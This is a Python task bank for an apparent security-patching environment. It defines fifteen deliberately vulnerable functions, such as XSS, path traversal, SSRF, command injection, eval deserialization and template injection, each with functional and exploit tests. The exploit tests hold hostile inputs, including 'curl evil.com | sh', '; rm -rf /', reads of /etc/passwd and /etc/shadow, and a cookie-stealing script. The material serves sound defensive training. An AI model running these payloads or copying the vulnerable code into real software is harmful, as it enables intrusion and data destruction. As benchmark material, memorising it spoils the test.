"""
Task bank for AppSecEnv — 15 real-world security vulnerability tasks.

Each task presents vulnerable Python code that the agent must patch.
Tasks are graded with dual testing:
  - Functional tests: normal inputs must still work correctly
  - Exploit tests: malicious inputs must be blocked (exception or safe output)

Tiers: 5 easy (common vulns) · 5 medium (nuanced) · 5 hard (complex/chained)
"""

from __future__ import annotations

import random
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple


@dataclass
class TestCase:
    """A single test case — either functional or exploit."""
    input_args: Tuple[Any, ...] = ()
    input_kwargs: Dict[str, Any] = field(default_factory=dict)
    expected_output: Any = None
    description: str = ""
    test_type: str = "functional"   # "functional" or "exploit"
    exploit_payload: str = ""       # For exploit tests: dangerous substring that must NOT appear in output


@dataclass
class Task:
    """A security vulnerability task with vulnerable code and dual test cases."""
    task_id: str = ""
    difficulty: str = ""
    vulnerability_type: str = ""
    cwe_id: str = ""
    description: str = ""
    vulnerable_code: str = ""
    function_signature: str = ""
    function_name: str = ""
    test_cases: List[TestCase] = field(default_factory=list)
    time_limit_s: float = 5.0


# ===========================================================================
# EASY TASKS (5) — Common, well-known vulnerabilities
# ===========================================================================

EASY_TASKS = [
    # ---- E1: XSS Prevention ----
    Task(
        task_id="e1_xss_escape",
        difficulty="easy",
        vulnerability_type="Cross-Site Scripting (XSS)",
        cwe_id="CWE-79",
        description=(
            "VULNERABILITY: Cross-Site Scripting (XSS)\n\n"
            "The function 'render_user_greeting' inserts user-supplied input directly\n"
            "into an HTML string without escaping. An attacker can inject <script> tags.\n\n"
            "YOUR TASK: Fix the function so that user input is HTML-escaped before\n"
            "insertion, while preserving the correct output for normal text inputs.\n"
            "Use Python's html.escape() or equivalent.\n\n"
            "IMPORTANT: The function signature and return format must stay the same.\n"
            "Normal text like 'Alice' should render unchanged. Only dangerous HTML\n"
            "characters (<, >, &, \", ') should be escaped."
        ),
        vulnerable_code=(
            "def render_user_greeting(name: str) -> str:\n"
            "    \"\"\"Render a personalized HTML greeting.\"\"\"\n"
            "    return f\"<div class='greeting'>Hello, {name}!</div>\""
        ),
        function_signature="def render_user_greeting(name: str) -> str:",
        function_name="render_user_greeting",
        test_cases=[
            # Functional tests
            TestCase(input_args=("Alice",), expected_output="<div class='greeting'>Hello, Alice!</div>",
                     description="Normal name renders correctly", test_type="functional"),
            TestCase(input_args=("Bob Smith",), expected_output="<div class='greeting'>Hello, Bob Smith!</div>",
                     description="Name with space renders correctly", test_type="functional"),
            TestCase(input_args=("",), expected_output="<div class='greeting'>Hello, !</div>",
                     description="Empty name renders correctly", test_type="functional"),
            # Exploit tests
            TestCase(input_args=("<script>alert('xss')</script>",), description="Script injection blocked",
                     test_type="exploit", exploit_payload="<script>"),
            TestCase(input_args=("<img src=x onerror='alert(1)'>",), description="Event handler injection blocked",
                     test_type="exploit", exploit_payload="onerror="),
            TestCase(input_args=("</div><script>steal(document.cookie)</script>",),
                     description="Tag-breaking injection blocked", test_type="exploit", exploit_payload="<script>"),
        ],
    ),

    # ---- E2: Path Traversal ----
    Task(
        task_id="e2_path_traversal",
        difficulty="easy",
        vulnerability_type="Path Traversal",
        cwe_id="CWE-22",
        description=(
            "VULNERABILITY: Path Traversal (Directory Traversal)\n\n"
            "The function 'resolve_file_path' joins a base directory with a user-supplied\n"
            "filename without checking if the result escapes the base directory.\n"
            "An attacker can use '../' sequences to read arbitrary files.\n\n"
            "YOUR TASK: Fix the function so that the resolved path always stays\n"
            "within base_directory. If traversal is detected, raise ValueError.\n"
            "Use os.path.normpath to resolve '..' sequences and verify the prefix."
        ),
        vulnerable_code=(
            "def resolve_file_path(base_directory: str, user_filename: str) -> str:\n"
            "    \"\"\"Resolve a user filename within a base directory.\"\"\"\n"
            "    import os\n"
            "    return os.path.join(base_directory, user_filename)"
        ),
        function_signature="def resolve_file_path(base_directory: str, user_filename: str) -> str:",
        function_name="resolve_file_path",
        test_cases=[
            TestCase(input_args=("/opt/uploads", "photo.jpg"),
                     expected_output="/opt/uploads/photo.jpg",
                     description="Normal filename resolves correctly", test_type="functional"),
            TestCase(input_args=("/opt/uploads", "docs/report.pdf"),
                     expected_output="/opt/uploads/docs/report.pdf",
                     description="Subdirectory path resolves correctly", test_type="functional"),
            TestCase(input_args=("/opt/uploads", "my_file.txt"),
                     expected_output="/opt/uploads/my_file.txt",
                     description="Simple filename resolves correctly", test_type="functional"),
            TestCase(input_args=("/opt/uploads", "../../etc/passwd"),
                     description="passwd traversal blocked", test_type="exploit", exploit_payload="/etc/passwd"),
            TestCase(input_args=("/opt/uploads", "../../../etc/shadow"),
                     description="shadow traversal blocked", test_type="exploit", exploit_payload="/etc/shadow"),
            TestCase(input_args=("/opt/uploads", ".."),
                     description="parent directory traversal blocked", test_type="exploit", exploit_payload="/opt"),
        ],
    ),

    # ---- E3: SSRF / URL Validation ----
    Task(
        task_id="e3_ssrf_validate",
        difficulty="easy",
        vulnerability_type="Server-Side Request Forgery (SSRF)",
        cwe_id="CWE-918",
        description=(
            "VULNERABILITY: Server-Side Request Forgery (SSRF)\n\n"
            "The function 'validate_fetch_url' accepts any URL for fetching external\n"
            "resources. An attacker can supply internal URLs like file:///etc/passwd\n"
            "or http://169.254.169.254/ (AWS metadata) to access internal services.\n\n"
            "YOUR TASK: Validate that the URL uses http:// or https:// scheme only,\n"
            "and reject URLs pointing to localhost, internal IPs (10.x, 172.16-31.x,\n"
            "192.168.x, 169.254.x), or the file:// scheme.\n"
            "Raise ValueError for invalid URLs. Return the URL unchanged if valid."
        ),
        vulnerable_code=(
            "def validate_fetch_url(url: str) -> str:\n"
            "    \"\"\"Validate a URL before fetching. Returns validated URL.\"\"\"\n"
            "    return url  # No validation!"
        ),
        function_signature="def validate_fetch_url(url: str) -> str:",
        function_name="validate_fetch_url",
        test_cases=[
            TestCase(input_args=("https://example.com/api/data",),
                     expected_output="https://example.com/api/data",
                     description="Valid HTTPS URL accepted", test_type="functional"),
            TestCase(input_args=("http://api.github.com/repos",),
                     expected_output="http://api.github.com/repos",
                     description="Valid HTTP URL accepted", test_type="functional"),
            TestCase(input_args=("https://cdn.example.com/image.png",),
                     expected_output="https://cdn.example.com/image.png",
                     description="CDN URL accepted", test_type="functional"),
            TestCase(input_args=("file:///etc/passwd",),
                     description="file:// scheme blocked", test_type="exploit", exploit_payload="file://"),
            TestCase(input_args=("http://169.254.169.254/latest/meta-data/",),
                     description="AWS metadata endpoint blocked", test_type="exploit", exploit_payload="169.254"),
            TestCase(input_args=("http://localhost:8080/admin",),
                     description="localhost access blocked", test_type="exploit", exploit_payload="localhost"),
        ],
    ),

    # ---- E4: HTTP Header Injection ----
    Task(
        task_id="e4_header_injection",
        difficulty="easy",
        vulnerability_type="HTTP Header Injection",
        cwe_id="CWE-113",
        description=(
            "VULNERABILITY: HTTP Header Injection (CRLF Injection)\n\n"
            "The function 'build_redirect_url' takes a user-supplied URL and returns\n"
            "it for use in a Location header. An attacker can inject \\r\\n characters\n"
            "to add arbitrary headers (e.g., Set-Cookie) or split the HTTP response.\n\n"
            "YOUR TASK: Remove or reject any \\r or \\n characters in the URL.\n"
            "Raise ValueError if CRLF characters are detected."
        ),
        vulnerable_code=(
            "def build_redirect_url(url: str) -> str:\n"
            "    \"\"\"Sanitize a URL for use in an HTTP Location header.\"\"\"\n"
            "    return url  # No CRLF check!"
        ),
        function_signature="def build_redirect_url(url: str) -> str:",
        function_name="build_redirect_url",
        test_cases=[
            TestCase(input_args=("https://example.com/dashboard",),
                     expected_output="https://example.com/dashboard",
                     description="Normal redirect URL accepted", test_type="functional"),
            TestCase(input_args=("/login?next=/home",),
                     expected_output="/login?next=/home",
                     description="Relative URL accepted", test_type="functional"),
            TestCase(input_args=("https://example.com/profile?id=42",),
                     expected_output="https://example.com/profile?id=42",
                     description="URL with query params accepted", test_type="functional"),
            TestCase(input_args=("https://evil.com\r\nSet-Cookie: admin=true",),
                     description="CRLF header injection blocked",
                     test_type="exploit", exploit_payload="\r\n"),
            TestCase(input_args=("https://evil.com\nX-Injected: true",),
                     description="LF injection blocked", test_type="exploit", exploit_payload="\n"),
            TestCase(input_args=("/redirect\r\n\r\n<html>evil</html>",),
                     description="Response splitting blocked", test_type="exploit", exploit_payload="\r\n"),
        ],
    ),

    # ---- E5: Insecure Randomness ----
    Task(
        task_id="e5_insecure_random",
        difficulty="easy",
        vulnerability_type="Insecure Randomness",
        cwe_id="CWE-330",
        description=(
            "VULNERABILITY: Use of Cryptographically Weak PRNG\n\n"
            "The function 'generate_reset_token' uses Python's 'random' module,\n"
            "which is NOT cryptographically secure. An attacker who knows the seed\n"
            "can predict all future tokens.\n\n"
            "YOUR TASK: Replace 'random' with the 'secrets' module for CSPRNG.\n"
            "The function should return a hex token of the specified byte length.\n"
            "Use secrets.token_hex(length) which returns a hex string of length*2 chars."
        ),
        vulnerable_code=(
            "def generate_reset_token(length: int = 16) -> str:\n"
            "    \"\"\"Generate a password reset token.\"\"\"\n"
            "    import random\n"
            "    chars = '0123456789abcdef'\n"
            "    return ''.join(random.choice(chars) for _ in range(length * 2))"
        ),
        function_signature="def generate_reset_token(length: int = 16) -> str:",
        function_name="generate_reset_token",
        test_cases=[
            # Functional: check token properties (length, charset)
            TestCase(input_args=(16,), expected_output=32,
                     description="Token length is correct (16 bytes = 32 hex chars)", test_type="functional"),
            TestCase(input_args=(8,), expected_output=16,
                     description="Short token length correct (8 bytes = 16 hex chars)", test_type="functional"),
            TestCase(input_args=(32,), expected_output=64,
                     description="Long token length correct (32 bytes = 64 hex chars)", test_type="functional"),
            # Exploit: predictability test — seeding random should NOT affect output
            TestCase(input_args=(16,), description="Token not predictable after random.seed()",
                     test_type="exploit", exploit_payload="__PREDICTABLE__"),
        ],
    ),
]


# ===========================================================================
# MEDIUM TASKS (5) — More nuanced vulnerabilities
# ===========================================================================

MEDIUM_TASKS = [
    # ---- M1: Command Injection ----
    Task(
        task_id="m1_command_injection",
        difficulty="medium",
        vulnerability_type="OS Command Injection",
        cwe_id="CWE-78",
        description=(
            "VULNERABILITY: OS Command Injection\n\n"
            "The function 'build_grep_command' constructs a shell command by\n"
            "interpolating the user-supplied search pattern directly into the\n"
            "command string. An attacker can append '; rm -rf /' or similar.\n\n"
            "YOUR TASK: Return the command as a LIST of arguments (safe for\n"
            "subprocess.run without shell=True). Also validate that the pattern\n"
            "contains only safe characters (alphanumeric, spaces, dots, hyphens).\n"
            "Raise ValueError for unsafe patterns."
        ),
        vulnerable_code=(
            "def build_grep_command(pattern: str, filepath: str) -> str:\n"
            "    \"\"\"Build a grep command to search for pattern in a file.\"\"\"\n"
            "    return f\"grep '{pattern}' {filepath}\""
        ),
        function_signature="def build_grep_command(pattern: str, filepath: str) -> list:",
        function_name="build_grep_command",
        test_cases=[
            TestCase(input_args=("error", "/var/log/app.log"),
                     expected_output=["grep", "error", "/var/log/app.log"],
                     description="Simple pattern builds correct command", test_type="functional"),
            TestCase(input_args=("warning", "output.txt"),
                     expected_output=["grep", "warning", "output.txt"],
                     description="Basic search builds correct command", test_type="functional"),
            TestCase(input_args=("test-pattern", "data.csv"),
                     expected_output=["grep", "test-pattern", "data.csv"],
                     description="Hyphenated pattern accepted", test_type="functional"),
            TestCase(input_args=("'; rm -rf /; echo '", "/var/log/app.log"),
                     description="Shell command injection blocked",
                     test_type="exploit", exploit_payload="rm -rf"),
            TestCase(input_args=("$(cat /etc/passwd)", "file.txt"),
                     description="Command substitution blocked",
                     test_type="exploit", exploit_payload="$("),
            TestCase(input_args=("test; curl evil.com | sh", "log.txt"),
                     description="Pipe injection blocked",
                     test_type="exploit", exploit_payload="curl"),
        ],
    ),

    # ---- M2: Insecure Deserialization ----
    Task(
        task_id="m2_insecure_deserialize",
        difficulty="medium",
        vulnerability_type="Insecure Deserialization",
        cwe_id="CWE-502",
        description=(
            "VULNERABILITY: Insecure Deserialization\n\n"
            "The function 'load_user_config' uses eval() to parse a configuration\n"
            "string, allowing arbitrary code execution. An attacker can inject\n"
            "Python code like __import__('os').system('rm -rf /').\n\n"
            "YOUR TASK: Replace eval() with safe parsing. Use json.loads() for\n"
            "JSON data or ast.literal_eval() for Python literals. Raise ValueError\n"
            "for data that cannot be safely parsed."
        ),
        vulnerable_code=(
            "def load_user_config(config_str: str) -> dict:\n"
            "    \"\"\"Parse a configuration string into a dictionary.\"\"\"\n"
            "    return eval(config_str)  # DANGEROUS: arbitrary code execution!"
        ),
        function_signature="def load_user_config(config_str: str) -> dict:",
        function_name="load_user_config",
        test_cases=[
            TestCase(input_args=('{"theme": "dark", "lang": "en"}',),
                     expected_output={"theme": "dark", "lang": "en"},
                     description="Valid JSON config parsed correctly", test_type="functional"),
            TestCase(input_args=('{"page_size": 25, "debug": false}',),
                     expected_output={"page_size": 25, "debug": False},
                     description="JSON with boolean parsed correctly", test_type="functional"),
            TestCase(input_args=('{"items": [1, 2, 3]}',),
                     expected_output={"items": [1, 2, 3]},
                     description="JSON with nested list parsed correctly", test_type="functional"),
            TestCase(input_args=("__import__('os').system('rm -rf /')",),
                     description="Code execution via import blocked",
                     test_type="exploit", exploit_payload="__import__"),
            TestCase(input_args=("exec('import shutil; shutil.rmtree(\"/\")')",),
                     description="Exec-based code execution blocked",
                     test_type="exploit", exploit_payload="exec"),
            TestCase(input_args=("(lambda: __import__('subprocess').call(['id']))()",),
                     description="Lambda-based code execution blocked",
                     test_type="exploit", exploit_payload="lambda"),
        ],
    ),

    # ---- M3: Broken Access Control (IDOR) ----
    Task(
        task_id="m3_idor_access",
        difficulty="medium",
        vulnerability_type="Broken Access Control (IDOR)",
        cwe_id="CWE-639",
        description=(
            "VULNERABILITY: Insecure Direct Object Reference (IDOR)\n\n"
            "The function 'get_user_document' returns any document by ID without\n"
            "checking if the requesting user owns it. An attacker can access\n"
            "other users' private documents by guessing document IDs.\n\n"
            "YOUR TASK: Add an authorization check. The function receives the\n"
            "requesting user's ID and must verify the document belongs to them.\n"
            "Raise PermissionError if the user doesn't own the document."
        ),
        vulnerable_code=(
            "def get_user_document(documents: dict, doc_id: str, requesting_user_id: str) -> dict:\n"
            "    \"\"\"Retrieve a document by ID. Documents have an 'owner_id' field.\"\"\"\n"
            "    if doc_id not in documents:\n"
            "        raise KeyError(f'Document {doc_id} not found')\n"
            "    return documents[doc_id]  # No ownership check!"
        ),
        function_signature="def get_user_document(documents: dict, doc_id: str, requesting_user_id: str) -> dict:",
        function_name="get_user_document",
        test_cases=[
            TestCase(
                input_args=(
                    {"doc1": {"title": "Report", "content": "Q4 data", "owner_id": "user_A"}},
                    "doc1", "user_A"
                ),
                expected_output={"title": "Report", "content": "Q4 data", "owner_id": "user_A"},
                description="Owner can access own document", test_type="functional"),
            TestCase(
                input_args=(
                    {"doc2": {"title": "Notes", "content": "Meeting notes", "owner_id": "user_B"}},
                    "doc2", "user_B"
                ),
                expected_output={"title": "Notes", "content": "Meeting notes", "owner_id": "user_B"},
                description="Another owner accesses own document", test_type="functional"),
            TestCase(
                input_args=(
                    {"doc1": {"title": "Secret", "content": "classified", "owner_id": "user_A"}},
                    "doc1", "user_B"
                ),
                description="Non-owner access blocked (IDOR attempt)",
                test_type="exploit", exploit_payload="classified"),
            TestCase(
                input_args=(
                    {"doc5": {"title": "Private", "content": "SSN: 123-45-6789", "owner_id": "admin"}},
                    "doc5", "attacker"
                ),
                description="Attacker cannot access admin document",
                test_type="exploit", exploit_payload="SSN"),
        ],
    ),

    # ---- M4: Open Redirect ----
    Task(
        task_id="m4_open_redirect",
        difficulty="medium",
        vulnerability_type="Open Redirect",
        cwe_id="CWE-601",
        description=(
            "VULNERABILITY: Open Redirect\n\n"
            "The function 'validate_redirect_target' accepts any URL as a redirect\n"
            "destination after login. An attacker can craft a URL like\n"
            "https://yoursite.com/login?next=https://evil.com to phish users.\n\n"
            "YOUR TASK: Only allow relative paths (starting with /) or URLs\n"
            "that belong to the same domain (allowed_domain parameter).\n"
            "Raise ValueError for external/malicious redirect targets."
        ),
        vulnerable_code=(
            "def validate_redirect_target(url: str, allowed_domain: str) -> str:\n"
            "    \"\"\"Validate redirect URL after login.\"\"\"\n"
            "    return url  # Accepts any URL — open redirect!"
        ),
        function_signature="def validate_redirect_target(url: str, allowed_domain: str) -> str:",
        function_name="validate_redirect_target",
        test_cases=[
            TestCase(input_args=("/dashboard", "example.com"), expected_output="/dashboard",
                     description="Relative path accepted", test_type="functional"),
            TestCase(input_args=("/settings/profile", "example.com"), expected_output="/settings/profile",
                     description="Nested relative path accepted", test_type="functional"),
            TestCase(input_args=("https://example.com/home", "example.com"),
                     expected_output="https://example.com/home",
                     description="Same-domain absolute URL accepted", test_type="functional"),
            TestCase(input_args=("https://evil.com/phish", "example.com"),
                     description="External domain redirect blocked",
                     test_type="exploit", exploit_payload="evil.com"),
            TestCase(input_args=("//evil.com/steal", "example.com"),
                     description="Protocol-relative redirect blocked",
                     test_type="exploit", exploit_payload="evil.com"),
            TestCase(input_args=("https://example.com.evil.com/fake", "example.com"),
                     description="Subdomain spoofing blocked",
                     test_type="exploit", exploit_payload="evil.com"),
        ],
    ),

    # ---- M5: Log Injection ----
    Task(
        task_id="m5_log_injection",
        difficulty="medium",
        vulnerability_type="Log Injection / Log Forging",
        cwe_id="CWE-117",
        description=(
            "VULNERABILITY: Log Injection\n\n"
            "The function 'format_log_entry' inserts user-controlled data into a\n"
            "log message without sanitization. An attacker can inject newlines to\n"
            "forge log entries, hide malicious activity, or corrupt log analysis.\n\n"
            "YOUR TASK: Sanitize the user_input by replacing or removing any\n"
            "newline characters (\\n, \\r) and other control characters.\n"
            "Return the formatted log string with sanitized input."
        ),
        vulnerable_code=(
            "def format_log_entry(level: str, user_input: str, timestamp: str) -> str:\n"
            "    \"\"\"Format a log entry with user-supplied data.\"\"\"\n"
            "    return f\"[{timestamp}] {level}: User action - {user_input}\""
        ),
        function_signature="def format_log_entry(level: str, user_input: str, timestamp: str) -> str:",
        function_name="format_log_entry",
        test_cases=[
            TestCase(input_args=("INFO", "logged in", "2024-01-15T10:30:00"),
                     expected_output="[2024-01-15T10:30:00] INFO: User action - logged in",
                     description="Normal log entry formatted correctly", test_type="functional"),
            TestCase(input_args=("WARN", "failed login attempt", "2024-01-15T10:31:00"),
                     expected_output="[2024-01-15T10:31:00] WARN: User action - failed login attempt",
                     description="Warning log formatted correctly", test_type="functional"),
            TestCase(input_args=("INFO", "viewed page 5", "2024-01-15T10:32:00"),
                     expected_output="[2024-01-15T10:32:00] INFO: User action - viewed page 5",
                     description="Page view log formatted correctly", test_type="functional"),
            TestCase(input_args=("INFO", "normal\n[2024-01-15] ADMIN: User promoted to admin", "2024-01-15T10:30:00"),
                     description="Newline-based log forging blocked",
                     test_type="exploit", exploit_payload="\n"),
            TestCase(input_args=("INFO", "action\r\n[CRITICAL] System breached", "2024-01-15T10:30:00"),
                     description="CRLF log injection blocked",
                     test_type="exploit", exploit_payload="\r\n"),
        ],
    ),
]


# ===========================================================================
# HARD TASKS (5) — Complex, multi-layered vulnerabilities
# ===========================================================================

HARD_TASKS = [
    # ---- H1: JWT Verification Bypass ----
    Task(
        task_id="h1_jwt_bypass",
        difficulty="hard",
        vulnerability_type="JWT Verification Bypass",
        cwe_id="CWE-347",
        description=(
            "VULNERABILITY: JWT Algorithm Confusion / Verification Bypass\n\n"
            "The function 'verify_jwt_token' decodes a JWT but doesn't enforce the\n"
            "expected algorithm. An attacker can change the header to 'alg: none'\n"
            "and the function will accept an unsigned token.\n\n"
            "YOUR TASK: Parse the JWT manually (base64), verify the algorithm is\n"
            "'HS256' only, and verify the signature using HMAC-SHA256 with the\n"
            "provided secret. Reject tokens with alg:none or mismatched signatures.\n"
            "Return the decoded payload dict on success. Raise ValueError on failure."
        ),
        vulnerable_code=(
            "def verify_jwt_token(token: str, secret: str) -> dict:\n"
            "    \"\"\"Verify and decode a JWT token.\"\"\"\n"
            "    import base64, json\n"
            "    parts = token.split('.')\n"
            "    if len(parts) != 3:\n"
            "        raise ValueError('Invalid token format')\n"
            "    # Decode payload without checking signature!\n"
            "    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n"
            "    return payload"
        ),
        function_signature="def verify_jwt_token(token: str, secret: str) -> dict:",
        function_name="verify_jwt_token",
        test_cases=[
            # We'll need to construct valid and invalid JWTs for testing
            # Valid JWT with HS256: header.payload.signature
            TestCase(input_args=("__VALID_JWT__", "mysecret"),
                     expected_output={"sub": "user123", "role": "user"},
                     description="Valid HS256 JWT accepted", test_type="functional"),
            TestCase(input_args=("__VALID_JWT_2__", "serversecret"),
                     expected_output={"sub": "admin", "role": "admin"},
                     description="Second valid JWT accepted", test_type="functional"),
            TestCase(input_args=("__ALG_NONE_JWT__", "mysecret"),
                     description="alg:none JWT rejected",
                     test_type="exploit", exploit_payload="user123"),
            TestCase(input_args=("__TAMPERED_JWT__", "mysecret"),
                     description="Tampered signature rejected",
                     test_type="exploit", exploit_payload="admin"),
        ],
        time_limit_s=5.0,
    ),

    # ---- H2: ReDoS Prevention ----
    Task(
        task_id="h2_redos_prevention",
        difficulty="hard",
        vulnerability_type="Regular Expression Denial of Service (ReDoS)",
        cwe_id="CWE-1333",
        description=(
            "VULNERABILITY: ReDoS (Regular Expression Denial of Service)\n\n"
            "The function 'validate_email_pattern' uses a regex with catastrophic\n"
            "backtracking. Certain inputs cause exponential matching time.\n\n"
            "YOUR TASK: Rewrite the regex to avoid nested quantifiers that cause\n"
            "backtracking. A safe email regex should be linear-time.\n"
            "The function should return True for valid emails, False for invalid.\n"
            "Must handle the adversarial input within 2 seconds."
        ),
        vulnerable_code=(
            "def validate_email_pattern(email: str) -> bool:\n"
            "    \"\"\"Validate email format using regex.\"\"\"\n"
            "    import re\n"
            "    # Vulnerable regex with catastrophic backtracking\n"
            "    pattern = r'^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+\\.)+[a-zA-Z]{2,}$'\n"
            "    return bool(re.match(pattern, email))"
        ),
        function_signature="def validate_email_pattern(email: str) -> bool:",
        function_name="validate_email_pattern",
        test_cases=[
            TestCase(input_args=("user@example.com",), expected_output=True,
                     description="Valid email accepted", test_type="functional"),
            TestCase(input_args=("admin@sub.domain.org",), expected_output=True,
                     description="Subdomain email accepted", test_type="functional"),
            TestCase(input_args=("invalid-email",), expected_output=False,
                     description="Invalid email rejected", test_type="functional"),
            TestCase(input_args=("@missing.com",), expected_output=False,
                     description="Missing local part rejected", test_type="functional"),
            # ReDoS payload: long string of 'a' chars without @ — causes exp backtracking
            TestCase(input_args=("a" * 50 + "!",), expected_output=False,
                     description="ReDoS payload handled without timeout (must complete in <2s)",
                     test_type="functional"),
        ],
        time_limit_s=3.0,
    ),

    # ---- H3: Template Injection ----
    Task(
        task_id="h3_template_injection",
        difficulty="hard",
        vulnerability_type="Server-Side Template Injection (SSTI)",
        cwe_id="CWE-1336",
        description=(
            "VULNERABILITY: Server-Side Template Injection (SSTI)\n\n"
            "The function 'render_template_string' uses Python's str.format() with\n"
            "user-controlled template strings. An attacker can access object\n"
            "attributes via format specifiers like {user.__class__.__mro__}.\n\n"
            "YOUR TASK: Only allow simple named placeholders (letters, digits,\n"
            "underscores, no dots or brackets). Use regex to validate that the\n"
            "template contains only safe {name} placeholders before rendering.\n"
            "Raise ValueError if the template contains dangerous patterns."
        ),
        vulnerable_code=(
            "def render_template_string(template: str, variables: dict) -> str:\n"
            "    \"\"\"Render a template string with provided variables.\"\"\"\n"
            "    return template.format(**variables)  # Format injection!"
        ),
        function_signature="def render_template_string(template: str, variables: dict) -> str:",
        function_name="render_template_string",
        test_cases=[
            TestCase(input_args=("Hello, {name}! Welcome to {site}.",
                                  {"name": "Alice", "site": "MyApp"}),
                     expected_output="Hello, Alice! Welcome to MyApp.",
                     description="Simple template renders correctly", test_type="functional"),
            TestCase(input_args=("Order #{order_id} confirmed.",
                                  {"order_id": "12345"}),
                     expected_output="Order #12345 confirmed.",
                     description="Single variable template works", test_type="functional"),
            TestCase(input_args=("Hi {user_name}, your balance is {balance}.",
                                  {"user_name": "Bob", "balance": "$100"}),
                     expected_output="Hi Bob, your balance is $100.",
                     description="Multiple variables render correctly", test_type="functional"),
            TestCase(input_args=("{user.__class__.__mro__}", {"user": "test"}),
                     description="Attribute access injection blocked",
                     test_type="exploit", exploit_payload="__class__"),
            TestCase(input_args=("{user.__init__.__globals__}", {"user": "test"}),
                     description="Globals access injection blocked",
                     test_type="exploit", exploit_payload="__globals__"),
            TestCase(input_args=("{0.__class__.__subclasses__()}", {"user": "test"}),
                     description="Positional + attribute access blocked",
                     test_type="exploit", exploit_payload="__subclasses__"),
        ],
    ),

    # ---- H4: Prototype / Config Pollution ----
    Task(
        task_id="h4_config_pollution",
        difficulty="hard",
        vulnerability_type="Mass Assignment / Config Pollution",
        cwe_id="CWE-915",
        description=(
            "VULNERABILITY: Mass Assignment / Configuration Pollution\n\n"
            "The function 'update_user_settings' merges user-supplied settings into\n"
            "the application config without filtering allowed keys. An attacker can\n"
            "set privileged fields like 'is_admin', 'role', or 'permissions'.\n\n"
            "YOUR TASK: Only allow updating whitelisted keys: 'theme', 'language',\n"
            "'timezone', 'notifications', 'page_size'. Silently ignore any keys\n"
            "not in the whitelist. Return the updated config dict."
        ),
        vulnerable_code=(
            "def update_user_settings(current_config: dict, user_updates: dict) -> dict:\n"
            "    \"\"\"Merge user-submitted settings into current config.\"\"\"\n"
            "    config = current_config.copy()\n"
            "    config.update(user_updates)  # Accepts ANY keys!\n"
            "    return config"
        ),
        function_signature="def update_user_settings(current_config: dict, user_updates: dict) -> dict:",
        function_name="update_user_settings",
        test_cases=[
            TestCase(
                input_args=(
                    {"theme": "light", "language": "en", "is_admin": False},
                    {"theme": "dark"}
                ),
                expected_output={"theme": "dark", "language": "en", "is_admin": False},
                description="Allowed key updated correctly", test_type="functional"),
            TestCase(
                input_args=(
                    {"theme": "light", "language": "en", "notifications": True},
                    {"language": "fr", "notifications": False}
                ),
                expected_output={"theme": "light", "language": "fr", "notifications": False},
                description="Multiple allowed keys updated", test_type="functional"),
            TestCase(
                input_args=(
                    {"theme": "dark", "is_admin": False, "role": "user"},
                    {"is_admin": True}
                ),
                description="is_admin privilege escalation blocked",
                test_type="exploit", exploit_payload="is_admin\": true"),
            TestCase(
                input_args=(
                    {"theme": "dark", "role": "user", "permissions": []},
                    {"role": "superadmin", "permissions": ["all"]}
                ),
                description="Role and permissions escalation blocked",
                test_type="exploit", exploit_payload="superadmin"),
        ],
    ),

    # ---- H5: Multi-Vulnerability Endpoint ----
    Task(
        task_id="h5_multi_vuln",
        difficulty="hard",
        vulnerability_type="Multiple Vulnerabilities (XSS + Injection + AuthZ)",
        cwe_id="CWE-20",
        description=(
            "VULNERABILITY: Multiple chained vulnerabilities in one function\n\n"
            "The function 'process_search_request' has THREE vulnerabilities:\n"
            "1. XSS: User query is inserted into HTML response without escaping\n"
            "2. Injection: User query is used to filter data via eval()\n"
            "3. Missing AuthZ: No role check — any user can search 'admin' data\n\n"
            "YOUR TASK: Fix ALL three vulnerabilities:\n"
            "1. HTML-escape the query in the response message\n"
            "2. Replace eval() with safe string matching (use 'in' operator)\n"
            "3. If data_scope is 'admin', require role == 'admin'\n"
            "Raise PermissionError for unauthorized access.\n"
            "Raise ValueError for injection attempts."
        ),
        vulnerable_code=(
            "def process_search_request(query: str, data: list, user_role: str, data_scope: str) -> dict:\n"
            "    \"\"\"Search data and return results with a summary message.\"\"\"\n"
            "    # Vulnerability 1: XSS in response\n"
            "    message = f\"<p>Results for: {query}</p>\"\n"
            "    # Vulnerability 2: eval-based filtering\n"
            "    results = [item for item in data if eval(f\"'{query}'.lower() in '{item}'.lower()\")]\n"
            "    # Vulnerability 3: no authorization check\n"
            "    return {'message': message, 'results': results, 'count': len(results)}"
        ),
        function_signature="def process_search_request(query: str, data: list, user_role: str, data_scope: str) -> dict:",
        function_name="process_search_request",
        test_cases=[
            TestCase(
                input_args=("report", ["Annual Report", "Budget Report", "Meeting Notes"], "user", "public"),
                expected_output={
                    "message": "<p>Results for: report</p>",
                    "results": ["Annual Report", "Budget Report"],
                    "count": 2
                },
                description="Normal search returns correct results", test_type="functional"),
            TestCase(
                input_args=("meeting", ["Staff Meeting", "Board Meeting", "Report"], "user", "public"),
                expected_output={
                    "message": "<p>Results for: meeting</p>",
                    "results": ["Staff Meeting", "Board Meeting"],
                    "count": 2
                },
                description="Case-insensitive search works", test_type="functional"),
            TestCase(
                input_args=("<script>alert(1)</script>", ["test data"], "user", "public"),
                description="XSS in search query blocked",
                test_type="exploit", exploit_payload="<script>"),
            TestCase(
                input_args=("' or True or '", ["secret"], "user", "public"),
                description="eval injection blocked",
                test_type="exploit", exploit_payload="secret"),
            TestCase(
                input_args=("data", ["Confidential Data", "Secret Plans"], "user", "admin"),
                description="Unauthorized admin scope access blocked",
                test_type="exploit", exploit_payload="Confidential"),
        ],
        time_limit_s=5.0,
    ),
]

# ===========================================================================
# Task registry
# ===========================================================================

ALL_TASKS: List[Task] = EASY_TASKS + MEDIUM_TASKS + HARD_TASKS
TASK_BY_ID: Dict[str, Task] = {t.task_id: t for t in ALL_TASKS}
TASKS_BY_DIFFICULTY: Dict[str, List[Task]] = {
    "easy": EASY_TASKS,
    "medium": MEDIUM_TASKS,
    "hard": HARD_TASKS,
}


def get_task(
    task_id: Optional[str] = None,
    difficulty: Optional[str] = None,
    seed: Optional[int] = None,
) -> Task:
    """Select a task by id, difficulty, or randomly."""
    if task_id and task_id in TASK_BY_ID:
        return TASK_BY_ID[task_id]
    if task_id:
        raise ValueError(f"Unknown task_id: {task_id}. Available: {list(TASK_BY_ID.keys())}")

    rng = random.Random(seed)

    if difficulty:
        if difficulty not in TASKS_BY_DIFFICULTY:
